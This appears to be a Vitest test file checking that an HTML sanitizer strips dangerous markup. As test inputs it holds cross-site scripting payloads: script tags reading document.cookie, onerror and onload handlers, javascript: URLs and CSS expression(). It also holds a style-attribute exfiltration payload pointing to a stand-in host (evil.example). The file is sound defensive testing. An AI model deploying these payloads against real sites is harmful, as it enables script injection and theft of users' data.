import { describe, expect, it } from 'vitest';
import { escapeHtml, sanitizeHtml, sanitizeToText } from './sanitizeHtml';

describe('sanitizeHtml', () => {
  it('removes <script> tags and their content entirely', () => {
    expect(sanitizeHtml('<p>hi</p><script>alert(document.cookie)</script>')).toBe('<p>hi</p>');
  });

  it('strips onerror and other event handler attributes', () => {
    expect(sanitizeHtml('<img src="x" onerror="alert(1)">')).not.toMatch(/onerror/i);
  });

  it('blocks javascript: URLs in href', () => {
    const out = sanitizeHtml('<a href="javascript:alert(1)">click</a>');
    expect(out).not.toMatch(/javascript:/i);
  });

  it('strips svg-based vectors (svg is a disallowed/dangerous tag)', () => {
    const out = sanitizeHtml('<svg onload="alert(1)"><circle /></svg>');
    expect(out).not.toMatch(/onload/i);
    expect(out).not.toMatch(/<svg/i);
  });

  it('keeps safe formatting tags', () => {
    expect(sanitizeHtml('<b>bold</b> and <em>emphasis</em>')).toBe('<b>bold</b> and <em>emphasis</em>');
  });

  it('rewrites external http(s) links with rel=noopener noreferrer', () => {
    const out = sanitizeHtml('<a href="https://example.com">link</a>');
    expect(out).toBe('<a href="https://example.com" rel="noopener noreferrer">link</a>');
  });

  it('strips unsafe href schemes but keeps the tag/text', () => {
    const out = sanitizeHtml('<a href="data:text/html,evil">click</a>');
    expect(out).not.toMatch(/href/i);
    expect(out).toContain('click');
  });

  // Regression for the 2026-07-10 audit: sanitizeAnchorTag() only inspected
  // href/rel, so an arbitrary `style` attribute (a CSS-exfiltration/tracking
  // vector via background:url(...)) survived completely intact on <a> tags,
  // even though the exact same payload on a <div> was correctly stripped.
  it('strips style (and any other non-allowlisted attribute) from anchor tags', () => {
    const out = sanitizeHtml(
      '<a href="https://good.com" style="background:url(https://evil.example/exfil?x=1)">click</a>'
    );
    expect(out).not.toMatch(/style/i);
    expect(out).not.toMatch(/evil\.example/i);
    expect(out).toBe('<a href="https://good.com" rel="noopener noreferrer">click</a>');
  });

  it('strips style from non-anchor tags too (existing behavior, unchanged)', () => {
    const out = sanitizeHtml('<div style="background:url(https://evil.example/exfil)">hi</div>');
    expect(out).toBe('<div>hi</div>');
  });

  it('preserves class and data-* attributes on anchor tags', () => {
    const out = sanitizeHtml('<a href="https://good.com" class="link" data-id="42">click</a>');
    expect(out).toContain('class="link"');
    expect(out).toContain('data-id="42"');
  });

  it('leaves a hrefless anchor tag with only class/data-* preserved', () => {
    const out = sanitizeHtml('<a name="section1">jump</a>');
    expect(out).not.toContain('name=');
    expect(out).toContain('jump');
  });

  it('does not choke on a lone closing </a> tag', () => {
    // </a> is an allowed tag's closer, so it passes through unchanged
    // (harmless on its own) rather than being treated as an attribute to
    // filter -- this just proves sanitizeAnchorTag's new opening-tag guard
    // doesn't throw or corrupt output on a closing tag.
    expect(sanitizeHtml('text</a>more')).toBe('text</a>more');
  });

  it('removes disallowed tags but keeps their text content', () => {
    expect(sanitizeHtml('<marquee>scrolling</marquee>')).toBe('scrolling');
  });

  it('strips CSS expression()', () => {
    const out = sanitizeHtml('<div style="width:expression(alert(1))">x</div>');
    expect(out).not.toMatch(/expression/i);
  });

  it('returns empty string for non-string input', () => {
    expect(sanitizeHtml(null)).toBe('');
    expect(sanitizeHtml(undefined)).toBe('');
    expect(sanitizeHtml(42)).toBe('');
  });
});

describe('escapeHtml', () => {
  it('escapes angle brackets and quotes', () => {
    expect(escapeHtml('<script>alert(1)</script>')).not.toMatch(/<script>/);
  });
});

describe('sanitizeToText', () => {
  it('neutralizes script tags and escapes remaining markup as text', () => {
    const out = sanitizeToText('<script>alert(1)</script><b>bold</b>');
    expect(out).not.toMatch(/<script/i);
    expect(out).not.toMatch(/<b>/);
  });
});
